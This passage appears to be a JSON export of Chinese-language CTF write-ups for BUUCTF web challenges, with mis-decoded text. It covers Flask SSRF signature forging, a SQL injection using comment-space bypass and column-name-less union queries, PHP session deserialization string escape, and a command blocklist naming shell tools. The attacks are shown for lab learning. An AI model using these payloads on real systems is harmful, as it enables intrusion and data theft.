param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0')\n```\n\nåˆ†æï¼š\n\næœ‰ä¸‰ä¸ªè·¯ç”±ï¼š`/geneSign` `/De1ta` `/`\n\n`/geneSign` è·¯ç”±æ˜¯è·å–ç­¾åçš„ é€šè¿‡getç»™paramä¼ å‚ ç„¶åè¿™é‡Œactionä¸æ˜¯æˆ‘ä»¬èƒ½æ”¹å˜çš„\n\nä¸€èµ·ä¼ å…¥getSign() \n\nè¿”å› `secert_key+param+action`çš„md5å€¼ è¿™é‡Œåªæœ‰paramæˆ‘ä»¬èƒ½æ§åˆ¶\n\n```cmake\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n```\n\nå†æ¥çœ‹`/De1ta`\n\n```cmake\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n```\n\ngetæ–¹å¼ç»™paramä¼ å‚ cookieä¼ actionå’Œsignçš„å€¼\n\nç»è¿‡ä¸€ä¸ªwaf è¿™é‡Œç”¨æ¥é˜²æ­¢ç”¨åè®®\n\nç„¶åä¼ å…¥Exec()\n\nå…ˆç»è¿‡checkSignå‡½æ•°æ£€æŸ¥ç­¾åæ˜¯å¦ç¬¦åˆ\n\n```cmake\n def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n```\n\nåˆ†åˆ«æœ‰ä¸¤ä¸ªifåˆ¤æ–­\n\nç¬¬ä¸€ä¸ªifï¼š å½“æœ‰actionæœ‰scanæ—¶æ³¨æ„è¿™é‡Œæ˜¯`in` è€Œä¸æ˜¯ `==`,ç”Ÿæˆä¸€ä¸ªtmpfileæ–‡ä»¶\n\nå°†paramä¼ å…¥scanå‡½æ•°\n\n```cmake\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n```\n\nè¿™é‡Œèƒ½çœ‹åˆ°`urllib.urlopen().read()`è¿™é‡Œå°±æ˜¯åˆ©ç”¨ç‚¹ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569071434-59e9ac4d-007e-413d-b3b5-6b0572ab50ae.png)\n\nç›¸å½“äºæ‰“å¼€paramè¿™ä¸ªæ–‡ä»¶ é¢˜ç›®ä¹Ÿæç¤ºflagåœ¨flag.txtä¸­\n\nè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆwafè¦ç¦ç”¨fileåè®®å’Œgopheråè®®ï¼ˆä¹Ÿå°±æ˜¯httpåè®®çš„å‰èº«ï¼‰\n\nå› ä¸ºssrfæ¼æ´ä¸€èˆ¬éƒ½å¯ä»¥æ­é…å¾ˆå¤šåè®®æ¥ç”¨\n\nç„¶åå°†scanå†…å®¹å†™å…¥åˆ°tmpfileæ–‡ä»¶ä¸­ ä½†æ˜¯æ²¡æ³•è¯»\n\nç¬¬äºŒä¸ªifï¼šå½“actionä¸­æœ‰readæ—¶ å°±ä¼šè¯»å‡ºæ¥èµ‹å€¼ç»™result[data]ç„¶å Execå‡½æ•°è¿”å›resultç»“æœ\n\nåšåˆ°è¿™é‡Œå½“æ€è·¯å°±å¾ˆæ¸…æ™°\n\nactionåŒæ—¶åŒ…æ‹¬scanå’Œreadæ—¶å€™æ—¢èƒ½å†™å…¥æ–‡ä»¶ä¹Ÿèƒ½è¯»å‡ºæ–‡ä»¶,ä½†æ˜¯æˆ‘ä»¬actionçš„å€¼æ˜¯æˆ‘ä»¬ä¿®æ”¹ä¸äº†çš„è¯¥æ€ä¹ˆåŠå‘¢\n\nå†æ¥çœ‹ç”Ÿæˆç­¾åè¿™é‡Œ`hashlib.md5(secert_key + param + action)` è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç»™paramä¼ å…¥flag.txtreadæ‹¼æ¥èµ·æ¥ å°±ç®—æˆ‘ä»¬æ²¡æœ‰ç»™actionä¼ read æœ€åmd5å€¼æ˜¯å°†æ•´ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥åŒ…å«readå€¼ è¿™å°±å¯ä»¥äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569721446-365d0287-38a5-4618-a182-6250f63d1336.png)\n\n`9b231caf6bf82362fa5f78bf8da3d6ec`è®°å½•ä¸‹æˆ‘ä»¬çš„ç­¾å \n\næˆåŠŸï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569831963-9cfa50d0-0e24-4628-9a49-3bc29f274ba6.png)\n","tags":["flaskæ¡†æ¶","python","ä»£ç å®¡è®¡"],"categories":["buuctf"]},{"title":"buuctf-49-[SWPU2019]Web1","url":"/post/89f21605.html","content":"\n[SWPU2019]Web1\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“æ— åˆ—åæ³¨å…¥çš„ä¸€é“é¢˜\n\nè¿›å…¥å‘ç°è¦æ³¨å†Œä¸€ä¸ªè´¦å·å¹¶ä¸”ç™»å½• å‘ç°adminå·²ç»è¢«æ³¨å†Œäº† æœ¬æ¥ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯æ‹¿åˆ°adminçš„å¯†ç å°±ç»“æŸäº†\n\nè¿›å»ä¹‹åæœ‰ä¸€ä¸ª å¯ä»¥å‘å¸ƒå†…å®¹çš„ çœ‹åˆ°è¿™é‡Œä»¥ä¸ºæ˜¯xssæ³¨å…¥ ä½†åæ¥çœ‹äº†å¤§ä½¬wp ä¸æ˜¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460509878-cf2a45c9-71c9-403f-baf5-1320d375227b.png)\n\nç„¶ååœ¨å‘å¸ƒå¹¿å‘Šå¹¿å‘Šåè¿™é‡Œå¯ä»¥è¿›è¡Œsqlæ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460618692-5b643a68-2285-4b0b-ba3e-280448656e8e.png)\n\nåˆ¤æ–­å­—æ®µæ•°ï¼Œå‘ç°`order by`è¢«ç¦ç”¨äº†æ‰€ä»¥ä¹‹åè”åˆæŸ¥è¯¢æ—¶å€™åŒ…å«`or`è¡¨ï¼Œæ•°æ®åº“éƒ½è¢«æ²³èŸ¹äº†ã€‚\n\nç©ºæ ¼ä¹Ÿè¢«æ²³èŸ¹äº† ç”¨`/**/`æ¥ç»•è¿‡ è¿™ä¸ªæœ¬æ¥æ˜¯mysqlç”¨äºå¤šè¡Œæ³¨é‡Šçš„\n\nå°±å¯ä»¥ç”¨`group by`ä»£æ›¿ æˆ–è€…select 1ï¼Œ2ï¼Œ3... æ ¹æ®å›æ˜¾åˆ¤æ–­å­—æ®µæ•°\n\nç„¶åè¿™é“é¢˜è¿˜æ²³èŸ¹äº†`# --`æ³¨é‡Šç¬¦ è¿™é‡Œç”¨åˆ°äº†é€šè¿‡é—­åˆåé¢çš„å•å¼•å·æ¥ç»•è¿‡ å‚è€ƒï¼šhttps://blog.csdn.net/qq_35733751/article/details/106462625\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460895563-48a68425-baff-4026-83d5-abaef46c9ef2.png)è¿™å¼ å›¾å°±å¯ä»¥å¾ˆå½¢è±¡è¡¨ç¤º\n\nåˆ¤æ–­å­—æ®µæ•°ï¼š`1'/**/group/**/by/**/22,'` è‡³äºè¿™ä¸ªæœ«å°¾çš„é€—å· åº”è¯¥æ˜¯èµ·ä¸€ä¸ªå­å¥çš„ä½œç”¨ å¦‚æœæ²¡æœ‰å°±ä¼šæŠ¥é”™\n\næŸ¥è¡¨ï¼š`1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/' `\n\nè¿™é‡Œç”¨åˆ°äº† `mysql.innodb_table_stats`å› ä¸º `or` è¢«æ²³èŸ¹äº†,åˆé•¿äº†ä¸€ä¸ªæ–°å§¿åŠ¿ è¿˜å¯ä»¥ç”¨ `sys.schema_auto_increment_columns`æŸ¥è¡¨å å‚è€ƒï¼šhttps://www.anquanke.com/post/id/193512\n\nçˆ†å‡ºè¡¨åï¼š\n\nFLAG_TABLE,news,users,gtid_slave_pos,ads,users\n\n å¾—åˆ°äº†è¡¨å ä¸€èˆ¬æ¥è¯´å°±è¦çˆ†åˆ—åäº† ä½†æ˜¯è¿™é“é¢˜ä¸çŸ¥é“åˆ—å ç„¶åå°±è¦ä½¿ç”¨æ— åˆ—åæ³¨å…¥äº†ï¼Œåœ¨æœ¬åœ°æ­äº†ä¸€ä¸ªç¯å¢ƒè¿›è¡Œæµ‹è¯•\n\nç®€å•æ¥è¯´æ— åˆ—åæ³¨å…¥ä¼šç»™è¡¨çš„åˆ—åèµ·ä¸€ä¸ªæ•°å­—ç§°è°“ï¼ˆasç”¨å­—ç¬¦å½“åˆ«ç§°ä¹Ÿè¡Œï¼‰ç„¶ååˆ©ç”¨æ•°å­—æŸ¥åˆ—å†…å®¹\n\nå‚è€ƒï¼šhttps://err0r.top/article/mardasctf/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461602828-24dea7a0-7adf-4c53-a4ff-bc34ae832eb0.png)\n\næ´¾ç”Ÿè¡¨è¦èµ·ä¸ªåˆ«å å¦‚ä¸‹å›¾ ä¸ç„¶ä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461677314-cb1fe5db-e76f-487f-9834-c88fd06c743b.png)\n\nå¦‚æœæ˜¯æ•°å­— åˆ™è¦ç”¨``åŒ…è£¹èµ·æ¥ å¦‚æœè¢«æ²³èŸ¹äº† å°±å¯ä»¥ç”¨èµ·åˆ«åçš„æ–¹å¼ç»•è¿‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461832358-ff3d43fb-a352-4cf2-96e6-507b3806b4b8.png)\n\næ„é€ ï¼š`1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461972121-cb82f694-b889-4a2d-b258-2298e09e2968.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678510108817-bea36dc4-e206-4942-a5bc-5ffc0c721b40.png)\n\nè‡³äºè¿™é‡Œä¸ºä»€ä¹ˆä¸­é—´æ˜¯åªæœ‰ select 1,2,3å°±ç»“æŸäº†  è¿™é‡Œæ²¡ææ˜ç™½\n\nå¦‚æœæˆ‘ä»¬å¤šåŠ ä¸ª4 æˆ–è€…å‡å»ä¸€ä¸ªæ•° åˆ™ä¼šå‡ºç°![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678462097766-eb91beb6-0645-4a0c-b7be-c13cc5138410.png)\n\nçˆ†å‡º æŸ¥è¯¢çš„åˆ—ä¸å¯¹åº”\n\nåŸå› æ˜¯ä¹‹åè”åˆæŸ¥è¯¢è¿™éƒ¨åˆ†å­—æ®µæ•°åªæœ‰3ä¸ªå­—æ®µ`union/**/select*from/**/users`\n\n`select å’Œ union select`ä¸€èµ·ç”¨çš„æ—¶å€™å‰åå­—æ®µæ•°å¿…é¡»ç›¸åŒ \n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-48-[å®‰æ´µæ¯ 2019]easy_serialize_php","url":"/post/5419e860.html","content":"\n[å®‰æ´µæ¯ 2019]easy_serialize_php\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸é¢˜ç›® ä¸€é“å­¦ä¹ é¢˜ç›®\n\næ‰“å¼€é¢˜ç›® çœ‹åˆ°æºç \n\n```php\n<?php\n\n\n$function = @$_GET['f'];\n\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\n\nextract($_POST);\n\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n\n$serialize_info = filter(serialize($_SESSION));\n\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028387439-5e30cbf1-2b4b-499a-8fda-01a0e0aafaa2.png)\n\nçœ‹åˆ°url æ˜¯`f=highli_file` çœ‹åˆ°æºç å°±æ˜ç™½äº†\n\n```php\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n```\n\nè¿™é‡Œå¯ä»¥è¯´æ˜¯ä¸»ç¨‹åºäº† é¢˜ç›®å½“`f=phpinfo()`è¾“å‡º`phpinfo()`æˆ‘ä»¬ä¼šæ‰¾åˆ°ä¸€äº›ä¸œè¥¿\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028629889-2e6333f7-e163-4197-b9e8-c7aec11be3b2.png)æœç„¶å‘ç°äº†å¯ç–‘phpæ–‡ä»¶ \n\nä¸»ç¨‹åºæœ‰file_get_contents() è¿™é‡Œåº”è¯¥å°±æ˜¯å»åŒ…å«æˆ‘ä»¬å‘ç°çš„d0g3_f1ag.phpæ–‡ä»¶\n\nè¿˜æœ‰ä¸€ä¸ªæˆ‘ä¸çŸ¥é“çš„ç‰¹æ®Šç‚¹ï¼š$_SESSIONæ•°ç»„ è¿™æ˜¯ä¸€ä¸ªæ•°ç»„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028879443-2428b4ea-e2bd-4b27-a61b-b9f600fbc766.png)\n\nè¿™é“é¢˜$_SESSIONå…±æœ‰ä¸‰ä¸ªå˜é‡åˆ†åˆ«ä¸º `user function img` å…¶å®imgç”¨æ¥å»åŒ…å«é‚£ä¸ªphpæ–‡ä»¶\n\nä½†æ˜¯è¿™é‡Œ\n\n```php\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n```\n\n$_SESSION['img']å…ˆé€šè¿‡base64åŠ å¯† ç„¶åå†è¿›è¡Œsha1()å‡½æ•° å°½ç®¡ä¸»å‡½æ•°æœ€ååŒ…å«æ–‡ä»¶ä¹‹å‰ä¼šæœ‰base64è§£å¯† ä½†æ˜¯sha1()å‡½æ•°æ˜æ˜¾å°±æ˜¯ä¸è®©æˆ‘ä»¬ç›´æ¥å°†flagæ–‡ä»¶èµ‹å€¼ç»™$_SESSION['img']\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678029789710-ca04d073-df07-40ab-bf30-5791bbfbffb8.png)\n\né‚£ä¹ˆåº”è¯¥æ€ä¹ˆè®©$_SESSION['img']ç­‰äºæˆ‘ä»¬çš„phpæ–‡ä»¶å‘¢ è¿™é‡Œæ€è·¯å¤§æ¦‚å°±æ˜¯ç±»ä¼¼äºç±»ååºåˆ—åŒ– \n\næœ¬åœ°åºåˆ—åŒ–æ„é€ åŒ…å«äº†phpæ–‡ä»¶çš„$_SESSION['img'] ç„¶åå†ååºåˆ—å»è¦†ç›–é‚£ä¸ªé¢˜ç›®ä¸­çš„$_SESSION['img']\n\nå†æ¥çœ‹è¿‡æ»¤è¿™éƒ¨åˆ† ç”¨ç©ºå­—ç¬¦å»æ­£åˆ™ä»£æ¢æˆ‘ä»¬çš„æ–‡ä»¶ååç¼€å\n\n```php\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n```\n\n\n\nè¿™é‡Œå°±ç”¨åˆ°äº†å­—ç¬¦ä¸²ååºåˆ—åŒ–æ²™ç®±é€ƒé€¸ å‚è€ƒhttps://www.jianshu.com/p/8e8117f9fd0e\n\né€šè¿‡ä¸€ä¸ªå°demoç®€å•çœ‹ä¸€ä¸‹åŸç†\n\n```php\n<?php\n//ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\n$a = array('123', 'abc', 'defg');\n$b=serialize($a); //a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"defg\";}\nvar_dump(unserialize($b));    \n// æ·»åŠ  i:2;s:4:\"love\";}\n$c='a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"love\";}i:2;s:4:\"defg\";}';\nvar_dump(unserialize($c));\n?>\n```\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682744765971-b50d2065-4da4-4695-b8cc-2ab0ab675374.png)\n\næœ¬åœ°æµ‹è¯•\n\n```php\n<?php\n$a ='/flag/';\n$_SESSION[\"user\"]='flagflagflagflagflagflag';\n$_SESSION[\"function\"]='a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}';\n$_SESSION[\"img\"]='L2QwZzNfZmxsbGxsbGFn';\n$b=serialize($_SESSION);\necho $b;\necho \"\\n\";\n$c=preg_replace($a,'',$b);\nvar_dump($c);\nprint_r(unserialize($c));\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030400496-4b376af4-9be1-4dab-a2b5-42423e634d5d.png)\n\nå°±æ˜¯é€šè¿‡ç‰¹æ„æ„é€ åºåˆ—åŒ– è®©$_SESSION[\"function\"]ä¸­çš„å†…å®¹ä»¿ç…§ååºåˆ—åŒ–åçš„$_SESSION[img]æ•°ç»„å†…å®¹ ä»è€Œè¾¾åˆ°è¦†ç›–\n\nå½“$_SESSION['user']ä¸­çš„24ä¸ªå­—ç¬¦è¢«ç©ºå­—ç¬¦ä»£æ›¿ä¹‹å ä¹‹åååºåˆ—åŒ–å°±ä¼šç»§ç»­å‘åé¢å¯»æ‰¾24ä¸ªå­—ç¬¦æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–è¯»å–`\";s:8:\"function\";s:59:\"a`è¿™24ä¸ªå­—ç¬¦ å¹¶ä¸”ä¹‹åè¿˜æœ‰`\";`ç¬¦åˆåœæ­¢çš„æ¡ä»¶ è€Œåç»§ç»­å‘åè¯»å–imgçš„20ä¸ªå­—ç¬¦ï¼Œç¬¬å››ä¸ªã€ç¬¬äº”ä¸ªså‘åè¯»å–å‡æ»¡è¶³è§„åˆ™ã€‚\n\nè¿™é‡Œéœ€è¦æ³¨æ„çš„ç‚¹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030563480-6f3a3535-4f70-44d3-9e72-3e42f519886c.png)\n\nè¿™é‡Œ`'a\"`å·¦è¾¹çš„å•å¼•å·æ˜¯å»é—­åˆè€…ä¸€æ•´æ®µå­—ç¬¦ä¸²å³è¾¹çš„å•å¼•å·\n\nå³è¾¹çš„åŒå¼•å·æ˜¯ä¸ºäº†å»é—­åˆåºåˆ—åŒ–åçš„`\"a\"`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030860232-9241224d-6736-4a96-9bad-e37f51653091.png)\n\nä¸ºä»€ä¹ˆæ˜¯4ä¸ªflag å³24ä¸ªå­—ç¬¦ è¦æ ¹æ®åé¢æ„é€ çš„å†…å®¹å»çµæ´»å˜åŠ¨\n\nç„¶åæ˜¯`}`æ„é€ çš„å­—ç¬¦ä¸²ä¸­æœ‰ä¸€ä¸ª`}`è¿™ä¸ªå¾ˆé‡è¦ ä¸€å¼€å§‹æœ¬åœ°æµ‹è¯•çš„ä¸€ç›´æŠ¥é”™ å‘ç°æ˜¯æŠŠè¿™ä¸ª`}`ç»™åˆ äº† è¿™ä¸ª`}`æ˜¯ç”¨æ¥ä¹‹åååºåˆ—åŒ–æ—¶å€™åŒ¹é…åœæ­¢åŒ¹é…çš„ä¸€ä¸ªç¬¦å·å§ï¼ˆæˆ‘æ˜¯è¿™æ ·è®¤ä¸ºçš„ï¼‰å¦‚æœä¸åŠ å°±ä¼šå¯¼è‡´æ²™ç®±é€ƒé€¸å¤±è´¥\n\nç„¶åå› ä¸ºåœ¨æ–‡ä»¶åŒ…å«ä¹‹å‰ä¼šæœ‰base64è§£ç  éœ€è¦æŠŠæˆ‘ä»¬å‘ç°çš„phpæ–‡ä»¶è¿›è¡Œbase64åŠ å¯†ä¹‹å å¼„è¿›æˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²ä¸­ \n\nä¹‹åé¢˜ç›®å°±è¿åˆƒè€Œè§£äº†ã€‚\n","tags":["ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"],"categories":["buuctf"]},{"title":"buuctf-44-[å®‰æ´µæ¯ 2019]easy_web","url":"/post/6fcfe2b3.html","content":"\n[å®‰æ´µæ¯ 2019]easy_web\n\n<!--more-->\n\næ‰“å¼€é¢˜ç›®æŠ“åŒ…åˆ†æï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855227157-8e11fe84-0449-443a-8d14-66b419638837.png)\n\nå‘ç°å›¾ç‰‡æ˜¯é€šè¿‡base64ç¼–ç è¿›è¡Œè¾“å‡ºçš„ çœ‹äº†å¤§ä½¬çš„wp `img=TXpVek5UTTFNbVUzTURabE5qYz0` å³æ–‡ä»¶åæ˜¯å…ˆè¿›è¡Œåå…­è¿›åˆ¶ç¼–ç åœ¨è¿›è¡Œä¸¤æ¬¡base64ç¼–ç  è§£ç æŸ¥çœ‹åŸæ–‡ä»¶å\n\nç¬¬ä¸€æ¬¡ï¼šbase64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855430402-2aaa6b54-1704-4a6d-9216-56d539fa2811.png)\n\nç¬¬äºŒæ¬¡: base64 å¾—åˆ°hexç¼–ç æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855472959-be5e14ca-4885-4c53-8f03-1d2b031eb8d5.png)\n\nç¬¬ä¸‰æ¬¡ï¼šåœ¨è¿›è¡Œåå…­è¿›åˆ¶è§£ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855501090-18a10c84-e855-4363-9d00-37618cb88138.png)\n\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™ç§æ–¹å¼è¿›è¡Œæ„é€ æŸ¥çœ‹index.php\n\nçˆ†å‡ºæºç :\n\n```php\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi~ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;  \n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n\n?>\n```\n\nä»£ç åˆ†æï¼š \n\ngetæ–¹å¼ä¼ å…¥cmd ä½†æ˜¯è¦è¿›è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…\n\nå†é€šè¿‡ postæ–¹å¼ä¼ aä¸b è¦æ±‚aä¸bä¸ç›¸ç­‰ ä½†æ˜¯md5åŠ å¯†åç›¸ç­‰\n\nå…ˆæ¥çœ‹æ­£åˆ™åŒ¹é…\n\næ²³èŸ¹äº†ä¸€äº›å¸¸ç”¨çš„linuxå‘½ä»¤å’Œä¸€äº›å­—ç¬¦  è¿™é‡Œé‡ç‚¹æ¥çœ‹ä¸€ä¸‹åæ–œæ çš„å±è”½ å…¶å®è¿™é“é¢˜è¿™é‡ŒåŒ¹é…åæ–œæ å‡ºç°é—®é¢˜äº†\n\næœ¬åœ°æµ‹è¯•ï¼š\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856125949-61736d5d-4b4e-4f84-839e-df9dfa4ed823.png)`|\\\\|\\\\\\\\|` è¿™é‡Œä¸¤ä¸ªåæ–œæ çš„ç¬¬äºŒä¸ªåæ–œæ è½¬ä¹‰äº†ç¬¬äºŒä¸ª`|` ä½¿å¾—è¿™ä¸€å—å‡ºç°äº†é”™è¯¯\n\næœ€ç»ˆè¿™é‡Œå°±æ˜¯åŒ¹é… `\\|\\\\\\\\`è¿™ä¸€å— å› æ­¤å¯ä»¥ç”¨åæ–œæ \n\næœ¬åœ°æµ‹è¯•ï¼š\n\n```php\n<?php\n$cmd=\"\\|\\\\\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856091671-e7091ec9-b81a-4757-9431-b32fc21a3a06.png)\n\nä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åŒ¹é…ä¸€ä¸ª`\\` é‚£ä¹ˆæˆ‘ä»¬åœ¨ç¼–å†™æ­£åˆ™çš„æ—¶å€™å°±éœ€è¦`\\\\\\`æ¥è¾¾åˆ°åŒ¹é…ä¸€ä¸ª`\\`çš„æ•ˆæœ\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif 